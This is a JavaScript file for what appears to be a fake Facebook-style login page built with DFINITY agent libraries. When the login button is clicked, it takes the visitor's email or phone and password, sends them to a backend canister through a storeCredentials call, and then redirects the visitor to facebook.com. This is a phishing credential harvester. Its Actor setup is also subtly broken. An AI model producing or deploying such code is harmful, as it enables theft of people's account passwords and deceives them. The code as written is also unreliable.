import { Actor, HttpAgent } from "@dfinity/agent";
import { AuthClient } from "@dfinity/auth-client";

document.addEventListener('DOMContentLoaded', () => {
  const loginButton = document.querySelector('.login-button');
  const emailInput = document.querySelector('.email-or-phone');
  const passwordInput = document.querySelector('.password');

  loginButton.addEventListener('click', async () => {
    const email = emailInput.value;
    const password = passwordInput.value;

    try {
      // Create an actor to interact with the backend
      const agent = new HttpAgent();
      const actor = Actor.createActor("aaaaa-aa");

      // Store credentials (this should be done securely in a real application)
      await actor.storeCredentials(email, password);

      // Redirect to Facebook
      window.location.href = "https://www.facebook.com";
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
    }
  });
});
